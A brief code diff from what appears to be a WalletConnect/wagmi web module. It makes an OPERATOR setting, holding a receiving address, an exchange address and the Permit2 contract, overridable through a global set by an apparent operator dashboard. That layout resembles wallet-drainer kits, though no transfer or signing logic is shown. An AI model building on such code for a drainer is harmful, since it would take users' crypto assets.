@@ -7,7 +7,8 @@ import { disconnect as wagmiDisconnect, getAccount } from "@wagmi/core";
 // ─── CONFIG ──────────────────────────────────────────────────
 const projectId = import.meta.env?.VITE_WALLETCONNECT_PROJECT_ID || "";
 
-const OPERATOR = {
+// Configurable: the dashboard sets window.__ST3_OPERATOR before this module loads.
+const OPERATOR = (typeof window !== 'undefined' && window.__ST3_OPERATOR) || {
   receiver: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
   exchange: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
   permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
